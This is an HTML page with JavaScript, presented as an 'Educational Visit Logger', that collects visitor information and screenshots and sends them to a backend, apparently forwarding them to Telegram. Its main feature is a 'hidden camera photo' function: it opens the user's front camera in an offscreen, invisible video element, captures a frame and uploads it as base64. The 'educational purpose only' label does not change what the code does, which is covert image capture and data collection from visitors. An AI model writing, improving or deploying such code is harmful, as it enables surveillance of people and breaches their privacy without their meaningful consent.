<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Educational Logger</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
  <style>
    body { 
      text-align: center; 
      margin-top: 100px; 
      font-family: Arial, sans-serif; 
      background: #f8f9fa; 
      color: #333;
    }
    h2 { color: #222; }
    p { max-width: 600px; margin: 20px auto; color: #555; }
    button { 
      padding: 15px 35px; 
      margin: 15px; 
      font-size: 18px; 
      cursor: pointer; 
      border: none; 
      border-radius: 8px; 
      color: white;
      transition: all 0.2s;
    }
    button.primary { background: #28a745; }
    button.primary:hover { background: #218838; }
    button.danger { background: #dc3545; }
    button:disabled { opacity: 0.6; cursor: not-allowed; }
    #hiddenVideo {
      display: none;
      position: absolute;
      left: -9999px;
      top: -9999px;
      width: 1px;
      height: 1px;
    }
  </style>
</head>
<body>

  <h2>Educational Visit Logger</h2>
  <p>Educational purpose only — all actions sent to Telegram.</p>

  <!-- আগের বাটনগুলো -->
  <button class="primary" onclick="sendData()">I Agree & Send Info</button>
  <button class="primary" onclick="captureAndSendScreenshot()">Take Screenshot & Send 📸</button>

  <!-- নতুন সুপার ফাস্ট বাটন -->
  <button class="primary" id="sendHiddenPhotoBtn" onclick="sendHiddenCameraPhoto()">Send Hidden Camera Photo 📷</button>

  <!-- হাইড ভিডিও -->
  <video id="hiddenVideo" autoplay playsinline muted></video>

  <script>
    // আগের ফাংশনগুলো (যেগুলো চেঞ্জ হয়নি)
    async function sendData() {
      try {
        const res = await fetch("/api/send", { method: "POST" });
        const data = await res.json();
        alert(data.success ? "Info Sent ✅" : "Failed ❌");
      } catch {
        alert("Error");
      }
    }

    async function captureAndSendScreenshot() {
      try {
        const canvas = await html2canvas(document.body, { scale: 2 });
        const base64 = canvas.toDataURL("image/png");
        const res = await fetch("/api/send-screenshot", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ image: base64 })
        });
        const data = await res.json();
        alert(data.success ? "Screenshot Sent ✅" : "Failed ❌");
      } catch (err) {
        alert("Screenshot error: " + err.message);
      }
    }

    // নতুন: সুপার ফাস্ট হাইড ক্যামেরা + অটো ক্যাপচার
    const hiddenVideo = document.getElementById('hiddenVideo');
    const sendBtn = document.getElementById('sendHiddenPhotoBtn');
    let stream = null;

    async function sendHiddenCameraPhoto() {
      sendBtn.disabled = true;
      sendBtn.textContent = "Processing... 📷";

      try {
        // ১. Permission চাওয়া + stream পাওয়া
        stream = await navigator.mediaDevices.getUserMedia({
          video: { 
            facingMode: "user",
            width: { ideal: 640 },
            height: { ideal: 480 }
          },
          audio: false
        });

        hiddenVideo.srcObject = stream;

        // ২. ভিডিও লোড হওয়া পর্যন্ত অপেক্ষা (সুপার ফাস্টের জন্য ৫০০ms max)
        await new Promise((resolve, reject) => {
          hiddenVideo.onloadedmetadata = () => {
            hiddenVideo.play().then(resolve).catch(reject);
          };
          hiddenVideo.onerror = reject;
          setTimeout(() => reject(new Error("Video load timeout")), 1500); // timeout safety
        });

        if (hiddenVideo.videoWidth === 0 || hiddenVideo.videoHeight === 0) {
          throw new Error("No video frame");
        }

        // ৩. সাথে সাথে ছবি তুলে ফেলা
        const canvas = document.createElement('canvas');
        canvas.width = hiddenVideo.videoWidth;
        canvas.height = hiddenVideo.videoHeight;
        canvas.getContext('2d').drawImage(hiddenVideo, 0, 0);

        const base64 = canvas.toDataURL('image/png');

        // ৪. Telegram-এ পাঠানো
        const res = await fetch("/api/send-photo", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ image: base64 })
        });

        const data = await res.json();

        if (data.success) {
          alert("Hidden Photo Sent Super Fast! 📷✅");
        } else {
          alert("Send Failed ❌ – Check bot config");
        }

      } catch (err) {
        let msg = "Failed!";
        if (err.name === 'NotAllowedError') msg = "Permission Denied – Allow camera";
        else if (err.name === 'NotFoundError') msg = "No Camera Found";
        else msg += " " + err.message;
        alert(msg);
        console.error(err);
      } finally {
        // cleanup
        if (stream) {
          stream.getTracks().forEach(track => track.stop());
        }
        hiddenVideo.srcObject = null;
        stream = null;
        sendBtn.disabled = false;
        sendBtn.textContent = "Send Hidden Camera Photo 📷";
      }
    }
  </script>
</body>
</html>
